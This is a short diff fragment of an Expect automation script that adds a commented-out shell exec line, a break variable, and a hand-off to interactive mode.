+#send "exec sh\r"
+#expect -re $prompt
+
+set user_break 0
+
+
+interactive
